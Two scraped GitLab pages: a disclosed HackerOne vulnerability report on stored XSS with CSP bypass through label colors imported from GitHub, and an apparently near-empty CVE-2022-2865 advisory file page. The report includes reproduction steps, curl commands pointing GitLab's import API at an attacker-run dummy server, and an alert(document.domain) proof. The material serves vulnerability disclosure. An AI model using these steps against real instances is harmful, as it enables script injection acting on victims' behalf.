=== Content from gitlab.com_7f71fcd7_20250114_191050.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Stored-XSS with CSP-bypass via labels' color

**[HackerOne report #1665658](https://hackerone.com/reports/1665658)** by `yvvdwf` on 2022-08-10, assigned to `GitLab Team`:

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

Gitlab allows to import a project from Github. It imports also the labels whose colors are not sanitized. This leads to Stored-XSS.

### Step to reproduce

To reproduce, we need the following prerequisite:

* Github does not allow neither to create arbitrary label colors. You can find in the attachment a dummy Github server
* A VM/machine to host the dummy server above with an public IP though that gitlab.com can access to.
* I created the dummy server using nodejs, so you need to have also nodejs on the machine
* A Gitlab personal access token. Go [here](https://gitlab.com/-/profile/personal_access_tokens?name=test&scopes=api) to create a new token with within `api` scope.

### Step 1: run the dummy server

* Copy the attachment file on your machine and decompress it to any folder, e.g., `/tmp/dummy-server`
* Go to `/tmp/dummy-server` then run this command: `node ./index.js YOUR_IP YOUR_PORT` in which, you should replace `IP` and `PORT` with the one you have. For example, `sudo node index.js 51.75.74.52 80`

### Step 2: trigger Gitlab import

* Open a new terminal, then run the following command in which:

  + `YOUR_IP` and `YOUR_PORT` by the values in the previous step
  + `YOUR_GITLAB_TOKEN` is the api token you've created in the pre-requirement
  + `YOUR_GITLAB_USERNAME` is the target namespace you want to import the project to. It can be your username, or a group name

```
curl -kv "https://gitlab.com/api/v4/import/github" \
  --request POST \
  --header "content-type: application/json" \
  --header "PRIVATE-TOKEN: YOUR_GITLAB_TOKEN" \
  --data '{
    "personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    "repo_id": "523303538",
    "target_namespace": "YOUR_GITLAB_USERNAME",
    "new_name": "xss-on-label-color",
    "github_hostname": "http://YOUR_IP:YOUR_PORT"
}'
```

For example:

```
curl -kv "https://gitlab.com/api/v4/import/github" \
  --request POST \
  --header "content-type: application/json" \
  --header "PRIVATE-TOKEN: AAAAAAAAAAAAAYYYYabc" \
  --data '{
    "personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    "repo_id": "523303538",
    "target_namespace": "yvvdwf",
    "new_name": "xss-on-label-color",
    "github_hostname": "http://51.75.74.52:80"
}'
```

After finishing, you can view the list of the labels of the imported project. You should see an popup created by this js `alert(document.domain)`

An example is available here (private project): <https://gitlab.com/yvvdwf/xss-on-label-color/-/labels>

### Impact

Stored-XSS with CSP-bypass allows attackers to execute arbitrary actions on behalf of victims at the client side.

#### Impact

Stored-XSS with CSP-bypass allows attackers to execute arbitrary actions on behalf of victims at the client side.

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [dummy-server.tar.gz](https://h1.sec.gitlab.net/a/035541dd-480b-4e48-8cc0-4fbb8be6692b/dummy-server.tar.gz)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.



=== Content from gitlab.com_3997df57_20250114_191050.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2022](/gitlab-org/cves/-/tree/master/2022)
* [**CVE-2022-2865.json**](/gitlab-org/cves/-/blob/master/2022/CVE-2022-2865.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2022/CVE-2022-2865.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2022/CVE-2022-2865.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![🤖 GitLab Bot 🤖's avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 "🤖 GitLab Bot 🤖")](/gitlab-bot)

  Oct 17, 2022

  [de45438c](/gitlab-org/cves/-/commit/de45438c37b41ca8621e2a9db97284fb8afebb43)
  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/de45438c37b41ca8621e2a9db97284fb8afebb43)
  ·
  de45438c

  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Oct 17, 2022

  de45438c

  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/de45438c37b41ca8621e2a9db97284fb8afebb43)
  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Oct 17, 2022

Loading


